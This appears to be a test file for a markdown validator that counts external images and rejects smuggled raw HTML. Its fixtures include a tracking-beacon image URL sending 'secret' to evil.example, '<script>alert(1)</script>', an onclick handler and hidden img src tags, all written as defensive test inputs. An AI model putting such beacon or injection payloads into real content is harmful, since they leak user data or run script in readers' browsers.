/**
 * Type-agnostic external-image disclosure.
 *
 * `parseMarkdown` walks Marked's token tree to count every native
 * `![](https://…)` image, every reference-style image whose definition
 * carries an https URL, and every image autolink. The count surfaces
 * on `observed.externalImageCount` so `deriveVerdict` can downgrade
 * markdown artifacts that reference resources the no-egress
 * validation run could not observe.
 */
import { describe, expect, test } from "bun:test";

import { parseMarkdown } from "../../src/validation/tier0/markdown";

function bytes(source: string): Uint8Array<ArrayBuffer> {
  return Uint8Array.from(new TextEncoder().encode(source));
}

describe("parseMarkdown — type-agnostic external image disclosure", () => {
  test("counts a native inline image with an https URL", () => {
    const result = parseMarkdown(bytes("![beacon](https://evil.example/track.png?d=secret)"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(1);
    }
  });

  test("counts multiple native inline images with https URLs", () => {
    const result = parseMarkdown(
      bytes(
        "![one](https://cdn.example/a.png) " +
          "![two](https://cdn.example/b.png) " +
          "![three](https://cdn.example/c.png)",
      ),
    );
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(3);
    }
  });

  test("does not count native images with relative or data: URLs", () => {
    const result = parseMarkdown(
      bytes(
        "![local](./relative.png) " +
          "![data](data:image/png;base64,AAA) " +
          "![abs](/static/x.png)",
      ),
    );
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });

  test("counts a reference-style image whose definition is https", () => {
    const result = parseMarkdown(bytes("![ref][cdn]\n\n[cdn]: https://cdn.example/ref.png"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(1);
    }
  });

  test("does not count a reference-style image whose definition is relative", () => {
    const result = parseMarkdown(bytes("![ref][local]\n\n[local]: ./local.png"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });

  test("counts an image with angle-bracketed autolink URL", () => {
    // CommonMark: `![alt](<https://…>)` is the canonical autolink form
    // for image destinations containing special characters. Marked
    // resolves the URL onto the image token's `href`.
    const result = parseMarkdown(bytes("![cdn](<https://cdn.example/auto.png>)"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(1);
    }
  });

  test("does not count a `link` (non-image) autolink as an external image", () => {
    // A bare `<https://…>` autolink produces a `link` token, not an
    // `image` token. The CSP `img-src` directive does not cover
    // navigation, so this is not an external-image disclosure.
    const result = parseMarkdown(bytes("https://cdn.example/just-a-link"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });

  test("counts combined inline + reference + autolink images in one document", () => {
    const result = parseMarkdown(
      bytes(
        "![one](https://cdn.example/a.png)\n" +
          "![two][ref]\n\n[ref]: https://cdn.example/b.png\n" +
          "![three](<https://cdn.example/c.png>)",
      ),
    );
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(3);
    }
  });

  test("raw HTML <img src=https://…> still rejects the document as a hostile smuggled reference", () => {
    const result = parseMarkdown(
      bytes('![one](https://cdn.example/a.png)\n<img src="https://cdn.example/b.png">'),
    );
    expect(result.status).toBe("error");
    if (result.status === "error") {
      expect(result.errors[0]!.code).toBe("html_external_reference_in_markdown");
    }
  });

  test("does not flag a document with no images", () => {
    const result = parseMarkdown(bytes("# Title\n\nParagraph.\n"));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.observed.externalImageCount).toBe(0);
    }
  });
});

/**
 * Per-container coverage.
 *
 * Marked emits a fixed set of block / inline token shapes; this is
 * every container that carries children (the recursive shapes) and a
 * few leaves that test specific red-flag paths. The per-container
 * table below pins the count the walker MUST reach for an image
 * placed in each shape.
 *
 *   shape                  | image counter must hit
 *   -----------------------+-------------------------
 *   paragraph (top-level)   | yes
 *   heading                 | yes
 *   blockquote              | yes (image inside paragraph child)
 *   list_item               | yes (image inside paragraph child)
 *   list                    | yes (multiple items, each contributes)
 *   ordered list_item       | yes
 *   table header cell       | yes
 *   table body cell         | yes
 *   nested list_item        | yes
 *   em (emphasis) wrapping  | yes
 *   link wrapping           | yes
 *   tableCell (nested)      | yes
 *
 * The fixture below places exactly one image in each shape; the total
 * count the walker reports MUST equal the number of images placed. If
 * the walker regresses (e.g. forgets to recurse `items[]` for lists),
 * the total drops by the per-shape count and the test reddens.
 *
 * SHOULD-B rides free on the same recursion: the raw-HTML red flags
 * (`<script>`, `on*=`, external `href`/`src`) MUST be detected when
 * smuggled into a list item or table cell, the same as a top-level
 * smuggled reference. The second fixture below proves both halves
 * together.
 */
describe("parseMarkdown — container recursion is complete", () => {
  test("counts one image in every container shape Marked emits", () => {
    const source = [
      "# H1 ![h](https://cdn.example/h.png)",
      "",
      "Paragraph ![p](https://cdn.example/p.png).",
      "",
      "> Quote ![q](https://cdn.example/q.png).",
      "",
      "- Unordered item ![u](https://cdn.example/u.png)",
      "- Second item with ![v](https://cdn.example/v.png)",
      "",
      "1. Ordered item ![o](https://cdn.example/o.png)",
      "2. Second ordered ![p2](https://cdn.example/p2.png)",
      "",
      "   - Nested item ![n](https://cdn.example/n.png)",
      "",
      "| Header ![th](https://cdn.example/th.png) | Header2 ![th2](https://cdn.example/th2.png) |",
      "| --- | --- |",
      "| Cell ![tc1](https://cdn.example/tc1.png) | Cell2 ![tc2](https://cdn.example/tc2.png) |",
      "",
      "*emphasis wrapping ![em](https://cdn.example/em.png)*",
      "",
      "[link wrapping ![li](https://cdn.example/li.png)](https://example.com)",
      "",
    ].join("\n");
    const result = parseMarkdown(bytes(source));
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      // 14 images placed (1 per shape × 14 shapes):
      // h, p, q, u, v, o, p2, n, th, th2, tc1, tc2, em, li
      expect(result.observed.externalImageCount).toBe(14);
    }
  });

  test("red flags (script / on* / external) reach every container shape", () => {
    // SHOULD-B: a `<script>` in a list item must reject the document
    // the same as a top-level smuggled script.
    const listScript = ["- list item with <script>alert(1)</script>", ""].join("\n");
    expect(parseMarkdown(bytes(listScript)).status).toBe("error");

    // ...and an `on*=` handler in a table cell.
    const tableOnHandler = [
      "| header |",
      "| --- |",
      '| cell with <button onclick="alert(1)">x</button> |',
      "",
    ].join("\n");
    expect(parseMarkdown(bytes(tableOnHandler)).status).toBe("error");

    // ...and an external `src=` smuggled into a table cell.
    const tableExternal = [
      "| header |",
      "| --- |",
      '| cell with <img src="https://cdn.example/smuggled.png"> |',
      "",
    ].join("\n");
    expect(parseMarkdown(bytes(tableExternal)).status).toBe("error");
  });
});
